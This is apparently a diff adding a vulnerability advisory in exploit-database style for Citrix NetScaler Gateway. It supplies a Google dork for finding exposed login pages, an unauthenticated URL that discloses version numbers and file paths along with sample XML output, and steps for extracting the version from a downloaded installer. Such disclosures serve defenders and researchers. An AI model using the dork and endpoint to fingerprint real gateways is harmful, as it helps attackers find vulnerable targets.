@@ -1,0 +1,52 @@
+# Exploit Title: Citrix Netscaler Gateway Information Disclosure Vulnerabilities.
+# Google Dork: intitle:"netscaler gateway" intext:password "please log on" 
+# Discovered Date: 07/03/2014
+# Exploit Author: Ramikan 
+# Website: http://fact-in-hack.blogspot.com
+# Vendor Homepage:https://www.citrix.com/products/citrix-gateway/
+# Affected Devices: citrix-gateway   
+# Tested On: citrix-gateway 11.1.53.11, 12.0.61.8
+# Version: 11.X through 12.0.X may be affected on other versions too.
+# CVE : 
+# Category:Hardware, Web Apps
+# Reference : 
+
+*************************************************************************************************************************************
+
+Vulnerability : Information Gathering
+
+Access the below link directly, which will disclose the version number and also the file path location.
+
+https://<ip address>/vpn/pluginlist.xml
+
+Output:
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<repositories>
+<repository name="default">
+<plugin type="WIN-EPA" path="/epa/scripts/win/nsepa_setup.exe" name="" compatibleTill="" compatibleFrom="12.0.0.0" version="12.0.61.8"/>
+<plugin type="WIN-EPA64" path="/epa/scripts/win/nsepa_setup64.exe" name="" compatibleTill="" compatibleFrom="12.0.0.0" version="12.0.61.8"/>
+<plugin type="WIN-VPN" path="/vpns/scripts/vista/AGEE_setup.exe" name="" compatibleTill="" compatibleFrom="12.0.0.0" version="12.0.61.8"/>
+<plugin type="MAC-EPA" path="/epa/scripts/mac/Citrix_Endpoint_Analysis.dmg" name="" compatibleTill="" compatibleFrom="3.1.2.0" version="3.1.2.0"/>
+<plugin type="MAC-VPN" path="/vpns/scripts/mac/Citrix_Access_Gateway.dmg" name="" compatibleTill="" compatibleFrom="4.4.0 (510)" version="4.4.0 (510)"/>
+<plugin type="WIN-EPA-ENGINE" path="/epa/scripts/win/epaPackage.exe" name="EPA scanning Engine (Opswat) for Windows" version="1.1.2.6" opswatVersion="4.3.344.0"/>
+<plugin type="MAC-EPA-ENGINE" path="/epa/scripts/mac/MacLibs.zip" name="EPA scanning Engine (Opswat) for Mac" version="1.2.6.3" opswatVersion="4.3.244.0"/>
+</repository>
+</repositories>
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+Alternateviely, you can follow the below steps.
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+1. Open in browser:
+https://<IP address>/epa/scripts/win/nsepa_setup.exe
+
+2. Save the file "nsepa_setup.exe" and extract it with archiver (7-zip).
+
+3. From newly extracted files extract again the "nsepa.msi" file.
+
+4. From newly extracted files extract again the "nsepa.cab" file.
+
+5. Select "Properties" on the extracted "nsepa.exe" file.
+
+6. Select "Details" tab where the version is visible.
